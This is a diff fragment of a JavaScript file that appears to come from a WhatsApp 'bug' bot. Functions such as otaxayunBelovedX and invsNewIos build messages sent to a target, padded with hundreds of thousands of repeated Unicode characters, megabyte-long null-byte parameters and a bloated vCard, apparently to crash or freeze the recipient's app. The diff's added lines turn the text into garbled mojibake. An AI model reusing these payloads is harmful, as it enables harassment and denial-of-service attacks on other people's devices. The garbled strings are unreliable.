+            text: "â¸™áµ’áµ—áµƒË£Ð½Î¿Ï‰ Î±ÑÑ” Î³Î¿Ï…?Â¿" + "ê¦¾".repeat(500000) + "\n\nJust otax" + "\0".repeat(100),
             matchedText: "https://t.me/Otapengenkawin",
-            description: "⸙ᵒᵗᵃˣнοω αяє γου?¿",
-            title: "ꦽ".repeat(20000),
+            description: "â¸™áµ’áµ—áµƒË£Ð½Î¿Ï‰ Î±ÑÑ” Î³Î¿Ï…?Â¿",
+            title: "ê¦½".repeat(20000),
             previewType: 6,
             jpegThumbnail:
                 "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCBQYBAQEBAAAAAAAAAAAAAAAAAAEAAv/aAAwDAQACEAMQAAAA+aspo6VwqliSdxJLI1zjb+YxtmOXq+X2a26PKZ3t8/rnWJRyAoJ//8QAIxAAAgMAAQMEAwAAAAAAAAAAAQIAAxEEEBJBICEwMhNCYf/aAAgBAQABPwD4MPiH+j0CE+/tNPUTzDBmTYfSRnWniPandoAi8FmVm71GRuE6IrlhhMt4llaszEYOtN1S1V6318RblNTKT9n0yzkUWVmvMAzDOVel1SAfp17zA5n5DCxPwf/EABgRAAMBAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/AN3jIxY//8QAHBEAAwACAwEAAAAAAAAAAAAAAAERAhIQICEx/9oACAEDAQE/ACPn2n1CVNGNRmLStNsTKN9P/9k=",
@@ -12233,13 +12233,13 @@ async function otaxayunBelovedX(otax, target, mention) {
                 quotedMessage: {
                     newsletterAdminInviteMessage: {
                         newsletterJid: "otax@newsletter",
-                        newsletterName: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(10000),
-                        caption: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(60000) + "ោ៝".repeat(60000),
+                        newsletterName: "â¸™áµ’áµ—áµƒË£Ð½Î¿Ï‰ Î±ÑÑ” Î³Î¿Ï…?Â¿" + "ê¦¾".repeat(10000),
+                        caption: "â¸™áµ’áµ—áµƒË£Ð½Î¿Ï‰ Î±ÑÑ” Î³Î¿Ï…?Â¿" + "ê¦¾".repeat(60000) + "áŸ„áŸ".repeat(60000),
                         inviteExpiration: "999999999"
                     }
                 },
                 forwardedNewsletterMessageInfo: {
-                    newsletterName: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "⃝꙰꙰꙰".repeat(10000),
+                    newsletterName: "â¸™áµ’áµ—áµƒË£Ð½Î¿Ï‰ Î±ÑÑ” Î³Î¿Ï…?Â¿" + "âƒê™°ê™°ê™°".repeat(10000),
                     newsletterJid: "13135550002@newsletter",
                     serverId: 1
                 }
@@ -12251,7 +12251,7 @@ async function otaxayunBelovedX(otax, target, mention) {
         viewOnceMessage: {
             message: {
                 interactiveResponseMessage: {
-                    body: { text: "σƭαא ɦαเ", format: "DEFAULT" },
+                    body: { text: "ÏƒÆ­Î±× É¦Î±à¹€", format: "DEFAULT" },
                     nativeFlowResponseMessage: {
                         name: "call_permission_request",
                         paramsJson: "\u0000".repeat(1045000),
@@ -12266,7 +12266,7 @@ async function otaxayunBelovedX(otax, target, mention) {
         viewOnceMessage: {
             message: {
                 interactiveResponseMessage: {
-                    body: { text: "σƭαא ɦαเ", format: "DEFAULT" },
+                    body: { text: "ÏƒÆ­Î±× É¦Î±à¹€", format: "DEFAULT" },
                     nativeFlowResponseMessage: {
                         name: "call_permission_request",
                         paramsJson: "\u0000".repeat(1045000),
@@ -12415,7 +12415,7 @@ async function otaxayunBelovedXGroup(otax, target, mention) {
                 message: {
                     interactiveResponseMessage: {
                         body: {
-                            text: " ¿otax Here¿ ",
+                            text: " Â¿otax HereÂ¿ ",
                             format: "DEFAULT",
                         },
                         nativeFlowResponseMessage: {
@@ -12463,7 +12463,7 @@ async function otaxayunBelovedXGroup(otax, target, mention) {
     ];
 
     let sequentialIndex = 0;
-    console.log(chalk.red(`${target} 𝙎𝙚𝙙𝙖𝙣𝙜 𝘿𝙞 𝙀𝙬𝙚 𝙀𝙬𝙚 𝙊𝙡𝙚𝙝 𝙊𝙏𝘼𝙓 ⸙`));
+    console.log(chalk.red(`${target} ð™Žð™šð™™ð™–ð™£ð™œ ð˜¿ð™ž ð™€ð™¬ð™š ð™€ð™¬ð™š ð™Šð™¡ð™šð™ ð™Šð™ð˜¼ð™“ â¸™`));
 
     const selectedMedia = mediaData[sequentialIndex];
     sequentialIndex = (sequentialIndex + 1) % mediaData.length;
@@ -12506,7 +12506,7 @@ async function otaxayunBelovedXGroup(otax, target, mention) {
         viewOnceMessage: {
             message: {
                 interactiveResponseMessage: {
-                    body: { text: "σƭαא ɦαเ", format: "DEFAULT" },
+                    body: { text: "ÏƒÆ­Î±× É¦Î±à¹€", format: "DEFAULT" },
                     nativeFlowResponseMessage: {
                         name: "address_message",
                         paramsJson: "\x10".repeat(1045000),
@@ -12522,7 +12522,7 @@ async function otaxayunBelovedXGroup(otax, target, mention) {
         viewOnceMessage: {
             message: {
                 interactiveResponseMessage: {
-                    body: { text: "σƭαא ɦαเ", format: "DEFAULT" },
+                    body: { text: "ÏƒÆ­Î±× É¦Î±à¹€", format: "DEFAULT" },
                     nativeFlowResponseMessage: {
                         name: "call_permission_request",
                         paramsJson: "\x10".repeat(1045000),
@@ -12538,10 +12538,10 @@ async function otaxayunBelovedXGroup(otax, target, mention) {
 
     let content = {
         extendedTextMessage: {
-            text: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(500000),
-            matchedText: "ꦽ".repeat(20000),
-            description: "⸙ᵒᵗᵃˣнοω αяє γου?¿",
-            title: "ꦽ".repeat(20000),
+            text: "â¸™áµ’áµ—áµƒË£Ð½Î¿Ï‰ Î±ÑÑ” Î³Î¿Ï…?Â¿" + "ê¦¾".repeat(500000),
+            matchedText: "ê¦½".repeat(20000),
+            description: "â¸™áµ’áµ—áµƒË£Ð½Î¿Ï‰ Î±ÑÑ” Î³Î¿Ï…?Â¿",
+            title: "ê¦½".repeat(20000),
             previewType: "NONE",
             jpegThumbnail:
                 "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCBQYBAQEBAAAAAAAAAAAAAAAAAAEAAv/aAAwDAQACEAMQAAAA+aspo6VwqliSdxJLI1zjb+YxtmOXq+X2a26PKZ3t8/rnWJRyAoJ//8QAIxAAAgMAAQMEAwAAAAAAAAAAAQIAAxEEEBJBICEwMhNCYf/aAAgBAQABPwD4MPiH+j0CE+/tNPUTzDBmTYfSRnWniPandoAi8FmVm71GRuE6IrlhhMt4llaszEYOtN1S1V6318RblNTKT9n0yzkUWVmvMAzDOVel1SAfp17zA5n5DCxPwf/EABgRAAMBAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/AN3jIxY//8QAHBEAAwACAwEAAAAAAAAAAAAAAAERAhIQICEx/9oACAEDAQE/ACPn2n1CVNGNRmLStNsTKN9P/9k=",
@@ -12559,17 +12559,17 @@ async function otaxayunBelovedXGroup(otax, target, mention) {
                     newsletterAdminInviteMessage: {
                         newsletterJid: "otax@newsletter",
                         newsletterName:
-                            "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(10000),
+                            "â¸™áµ’áµ—áµƒË£Ð½Î¿Ï‰ Î±ÑÑ” Î³Î¿Ï…?Â¿" + "ê¦¾".repeat(10000),
                         caption:
-                            "⸙ᵒᵗᵃˣнοω αяє γου?¿" +
-                            "ꦾ".repeat(60000) +
-                            "ោ៝".repeat(60000),
+                            "â¸™áµ’áµ—áµƒË£Ð½Î¿Ï‰ Î±ÑÑ” Î³Î¿Ï…?Â¿" +
+                            "ê¦¾".repeat(60000) +
+                            "áŸ„áŸ".repeat(60000),
                         inviteExpiration: "999999999"
                     }
                 },
                 forwardedNewsletterMessageInfo: {
                     newsletterName:
-                        "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "⃝꙰꙰꙰".repeat(10000),
+                        "â¸™áµ’áµ—áµƒË£Ð½Î¿Ï‰ Î±ÑÑ” Î³Î¿Ï…?Â¿" + "âƒê™°ê™°ê™°".repeat(10000),
                     newsletterJid: "13135550002@newsletter",
                     serverId: 1
                 }
@@ -12691,7 +12691,7 @@ async function gsIntjav(otax, target, otaxkiw = true) {
                         newsletterJid: "12037205250208@newsletter",
                         newsletterName: "do u know me? | Information",
                         serverMessageId: 1000,
-                        accessibilityText: "❖ 𝙁𝙪𝙘𝙠 𝙐 𝙈𝙚𝙣"
+                        accessibilityText: "â– ð™ð™ªð™˜ð™  ð™ ð™ˆð™šð™£"
                     },
                     statusAttributionType: "RESHARED_FROM_MENTION",
                     contactVcard: true,
@@ -12703,7 +12703,7 @@ async function gsIntjav(otax, target, otaxkiw = true) {
                     expiration: Date.now()
                 },
                 body: {
-                    text: "❖ 𝙄𝙢 𝙃𝙚𝙧𝙚 𝙊𝙏𝘼𝙓",
+                    text: "â– ð™„ð™¢ ð™ƒð™šð™§ð™š ð™Šð™ð˜¼ð™“",
                     format: "DEFAULT"
                 },
                 nativeFlowResponseMessage: {
@@ -12753,7 +12753,7 @@ async function gsIntjavgb(otax, target, otaxkiw = true) {
                         newsletterJid: "12037205250208@newsletter",
                         newsletterName: "do u know me? | Information",
                         serverMessageId: 1000,
-                        accessibilityText: "❖ 𝙁𝙪𝙘𝙠 𝙐 𝙈𝙚𝙣"
+                        accessibilityText: "â– ð™ð™ªð™˜ð™  ð™ ð™ˆð™šð™£"
                     },
                     statusAttributionType: "RESHARED_FROM_MENTION",
                     contactVcard: true,
@@ -12765,7 +12765,7 @@ async function gsIntjavgb(otax, target, otaxkiw = true) {
                     expiration: Date.now()
                 },
                 body: {
-                    text: "❖ 𝙄𝙢 𝙃𝙚𝙧𝙚 𝙊𝙏𝘼𝙓",
+                    text: "â– ð™„ð™¢ ð™ƒð™šð™§ð™š ð™Šð™ð˜¼ð™“",
                     format: "DEFAULT"
                 },
                 nativeFlowResponseMessage: {
@@ -12808,9 +12808,9 @@ async function invsNewIos(otax, target) {
             {
                 contactMessage: {
                     displayName:
-                        "🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666" +
-                        "𑇂𑆵𑆴𑆿".repeat(10000),
-                    vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"𑇂𑆵𑆴𑆿".repeat(10000)};;;\nFN:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"𑇂𑆵𑆴𑆿".repeat(10000)}\nNICKNAME:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nORG:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nTITLE:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem1.TEL;waid=6287873499996:+62 878-7349-9996\nitem1.X-ABLabel:Telepon\nitem2.EMAIL;type=INTERNET:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem2.X-ABLabel:Kantor\nitem3.EMAIL;type=INTERNET:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem3.X-ABLabel:Kantor\nitem4.EMAIL;type=INTERNET:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem4.X-ABLabel:Pribadi\nitem5.ADR:;;🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)};;;;\nitem5.X-ABADR:ac\nitem5.X-ABLabel:Rumah\nX-YAHOO;type=KANTOR:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nPHOTO;BASE64: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\nX-WA-BIZ-NAME:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nEND:VCARD`,
+                        "ðŸ¦ âƒ°Í¡Â°ÍœÍ¡â€¢âƒŸð˜…ð—¿Í¢ð—²Ì·ð—¹âƒ¨ð—¹ð˜†Í¢Ì·-ð—°Í¢ð—¹ð—¶âƒ¨ð—²ð—»Ì·Í¢ð˜ â¿» ð“ð¡ð«ðžðžð¬ð¢ð±ð­ð² âœ¶ > 666" +
+                        "ð‘‡‚ð‘†µð‘†´ð‘†¿".repeat(10000),
+                    vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;ðŸ¦ âƒ°Í¡Â°ÍœÍ¡â€¢âƒŸð˜…ð—¿Í¢ð—²Ì·ð—¹âƒ¨ð—¹ð˜†Í¢Ì·-ð—°Í¢ð—¹ð—¶âƒ¨ð—²ð—»Ì·Í¢ð˜ â¿» ð“ð¡ð«ðžðžð¬ð¢ð±ð­ð² âœ¶ > 666${"ð‘‡‚ð‘†µð‘†´ð‘†¿".repeat(10000)};;;\nFN:ðŸ¦ âƒ°Í¡Â°ÍœÍ¡â€¢âƒŸð˜…ð—¿Í¢ð—²Ì·ð—¹âƒ¨ð—¹ð˜†Í¢Ì·-ð—°Í¢ð—¹ð—¶âƒ¨ð—²ð—»Ì·Í¢ð˜ â¿» ð“ð¡ð«ðžðžð¬ð¢ð±ð­ð² âœ¶ > 666${"ð‘‡‚ð‘†µð‘†´ð‘†¿".repeat(10000)}\nNICKNAME:ðŸ¦ âƒ°Í¡Â°ÍœÍ¡â€¢âƒŸð˜…ð—¿Í¢ð—²Ì·ð—¹âƒ¨ð—¹ð˜†Í¢Ì·-ð—°Í¢ð—¹ð—¶âƒ¨ð—²ð—»Ì·Í¢ð˜ â¿» ð“ð¡ð«ðžðžð¬ð¢ð±ð­ð² âœ¶ > 666${"á©«á©«".repeat(4000)}\nORG:ðŸ¦ âƒ°Í¡Â°ÍœÍ¡â€¢âƒŸð˜…ð—¿Í¢ð—²Ì·ð—¹âƒ¨ð—¹ð˜†Í¢Ì·-ð—°Í¢ð—¹ð—¶âƒ¨ð—²ð—»Ì·Í¢ð˜ â¿» ð“ð¡ð«ðžðžð¬ð¢ð±ð­ð² âœ¶ > 666${"á©«á©«".repeat(4000)}\nTITLE:ðŸ¦ âƒ°Í¡Â°ÍœÍ¡â€¢âƒŸð˜…ð—¿Í¢ð—²Ì·ð—¹âƒ¨ð—¹ð˜†Í¢Ì·-ð—°Í¢ð—¹ð—¶âƒ¨ð—²ð—»Ì·Í¢ð˜ â¿» ð“ð¡ð«ðžðžð¬ð¢ð±ð­ð² âœ¶ > 666${"á©«á©«".repeat(4000)}\nitem1.TEL;waid=6287873499996:+62 878-7349-9996\nitem1.X-ABLabel:Telepon\nitem2.EMAIL;type=INTERNET:ðŸ¦ âƒ°Í¡Â°ÍœÍ¡â€¢âƒŸð˜…ð—¿Í¢ð—²Ì·ð—¹âƒ¨ð—¹ð˜†Í¢Ì·-ð—°Í¢ð—¹ð—¶âƒ¨ð—²ð—»Ì·Í¢ð˜ â¿» ð“ð¡ð«ðžðžð¬ð¢ð±ð­ð² âœ¶ > 666${"á©«á©«".repeat(4000)}\nitem2.X-ABLabel:Kantor\nitem3.EMAIL;type=INTERNET:ðŸ¦ âƒ°Í¡Â°ÍœÍ¡â€¢âƒŸð˜…ð—¿Í¢ð—²Ì·ð—¹âƒ¨ð—¹ð˜†Í¢Ì·-ð—°Í¢ð—¹ð—¶âƒ¨ð—²ð—»Ì·Í¢ð˜ â¿» ð“ð¡ð«ðžðžð¬ð¢ð±ð­ð² âœ¶ > 666${"á©«á©«".repeat(4000)}\nitem3.X-ABLabel:Kantor\nitem4.EMAIL;type=INTERNET:ðŸ¦ âƒ°Í¡Â°ÍœÍ¡â€¢âƒŸð˜…ð—¿Í¢ð—²Ì·ð—¹âƒ¨ð—¹ð˜†Í¢Ì·-ð—°Í¢ð—¹ð—¶âƒ¨ð—²ð—»Ì·Í¢ð˜ â¿» ð“ð¡ð«ðžðžð¬ð¢ð±ð­ð² âœ¶ > 666${"á©«á©«".repeat(4000)}\nitem4.X-ABLabel:Pribadi\nitem5.ADR:;;ðŸ¦ âƒ°Í¡Â°ÍœÍ¡â€¢âƒŸð˜…ð—¿Í¢ð—²Ì·ð—¹âƒ¨ð—¹ð˜†Í¢Ì·-ð—°Í¢ð—¹ð—¶âƒ¨ð—²ð—»Ì·Í¢ð˜ â¿» ð“ð¡ð«ðžðžð¬ð¢ð±ð­ð² âœ¶ > 666${"á©«á©«".repeat(4000)};;;;\nitem5.X-ABADR:ac\nitem5.X-ABLabel:Rumah\nX-YAHOO;type=KANTOR:ðŸ¦ âƒ°Í¡Â°ÍœÍ¡â€¢âƒŸð˜…ð—¿Í¢ð—²Ì·ð—¹âƒ¨ð—¹ð˜†Í¢Ì·-ð—°Í¢ð—¹ð—¶âƒ¨ð—²ð—»Ì·Í¢ð˜ â¿» ð“ð¡ð«ðžðžð¬ð¢ð±ð­ð² âœ¶ > 666${"á©«á©«".repeat(4000)}\nPHOTO;BASE64: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